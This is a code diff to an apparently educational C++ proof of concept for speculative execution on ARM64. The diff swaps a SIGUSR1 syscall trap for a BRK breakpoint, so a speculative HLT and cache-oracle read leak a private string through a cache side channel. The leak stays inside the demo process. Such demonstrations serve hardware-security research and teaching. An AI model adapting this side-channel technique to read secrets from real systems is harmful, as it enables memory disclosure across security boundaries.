@@ -14,6 +14,12 @@
  * limitations under the License.
  */
 
+/**
+ * In this example we demonstrate speculative execution over BRK instruction
+ * that is executed non-speculatively and HLT instruction that is executed
+ * speculatively.
+ **/
+
 #include "compiler_specifics.h"
 
 #if !SAFESIDE_LINUX
@@ -29,15 +35,11 @@
 #include <iostream>
 
 #include <signal.h>
-#include <sys/syscall.h>
-#include <sys/types.h>
-#include <unistd.h>
 
 #include "cache_sidechannel.h"
 #include "instr.h"
 #include "local_content.h"
 #include "meltdown_local_content.h"
-#include "utils.h"
 
 static char LeakByte(const char *data, size_t offset) {
   CacheSideChannel sidechannel;
@@ -47,21 +49,18 @@ static char LeakByte(const char *data, size_t offset) {
     size_t safe_offset = run % strlen(public_data);
     sidechannel.FlushOracle();
 
-    // Architecturally access the safe offset.
+    // Successful execution accesses safe_offset.
     ForceRead(oracle.data() + static_cast<size_t>(data[safe_offset]));
 
-    // Sends a SIGUSR1 signal to itself. The signal handler shifts the control
-    // flow to the "afterspeculation" label.
-    // We don't want to use the "syscall" library function in order to avoid
-    // Spectre v2 effects that the CPU jumps over that call, because we cannot
-    // serialize that later.
-    asm volatile(
-        "mov x8, %0\n"
-        "mov x0, %1\n"
-        "mov x1, %2\n"
-        "svc #0\n"::"r"(__NR_kill), "r"(getpid()), "r"(SIGUSR1));
+    // Executes self-hosted breakpoint. That saises SIGTRAP.
+    asm volatile("brk #0");
 
-    // Unreachable code. Speculatively access the unsafe offset.
+    // Architecturally unreachable code begins.
+    // Speculatively runs also over the HLT instruction (external debug
+    // breakpoint) without being serialized.
+    asm volatile("hlt #0");
+
+    // Speculatively accesses the memory oracle.
     ForceRead(oracle.data() + static_cast<size_t>(data[offset]));
 
     std::cout << "Dead code. Must not be printed." << std::endl;
@@ -72,7 +71,7 @@ static char LeakByte(const char *data, size_t offset) {
       exit(EXIT_FAILURE);
     }
 
-    // SIGUSR1 signal handler moves the instruction pointer to this label.
+    // SIGTRAP signal handler moves the instruction pointer to this label.
     asm volatile("afterspeculation:");
 
     std::pair<bool, char> result =
@@ -90,7 +89,7 @@ static char LeakByte(const char *data, size_t offset) {
 }
 
 int main() {
-  OnSignalMoveRipToAfterspeculation(SIGUSR1);
+  OnSignalMoveRipToAfterspeculation(SIGTRAP);
   std::cout << "Leaking the string: ";
   std::cout.flush();
   const size_t private_offset = private_data - public_data;
